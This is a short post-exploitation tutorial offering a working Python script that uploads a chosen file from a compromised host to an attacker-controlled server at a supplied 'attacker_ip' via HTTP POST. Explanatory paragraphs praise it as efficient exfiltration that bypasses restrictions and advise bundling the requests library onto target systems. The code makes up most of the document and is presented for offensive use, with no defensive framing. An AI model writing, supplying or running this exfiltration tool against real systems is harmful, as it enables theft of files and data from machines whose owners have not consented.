Simple HTTP File Upload with Python

Facilitating data exfiltration using a basic Python requests client.

import requests
import sys

if len(sys.argv) < 3:
    print("Usage: python upload_client.py <file_path> <attacker_ip>")
    sys.exit(1)

file_path = sys.argv[1]
attacker_ip = sys.argv[2]
url = f"http://{attacker_ip}/upload.php"

try:
    with open(file_path, 'rb') as f:
        files = {'file': (file_path.split('/')[-1], f)}
        response = requests.post(url, files=files)
        print(f"Server response: {response.text}")
except Exception as e:
    print(f"Error uploading file: {e}")

Leveraging the `requests` Library

The script utilizes Python's popular requests library to handle HTTP POST requests, simplifying the process of sending files over the network.

Efficient Data Exfiltration

This method provides a quick and reliable way to transfer files from a compromised host to an attacker-controlled web server, bypassing common restrictions.

Dependency Consideration

The requests library might not be pre-installed on all target systems. Consider bundling it or using a simpler Python HTTP client if dependencies are an issue.

Key Takeaway

Python's `requests` library offers a robust and easy-to-implement solution for HTTP-based file exfiltration, a critical capability in post-exploitation.
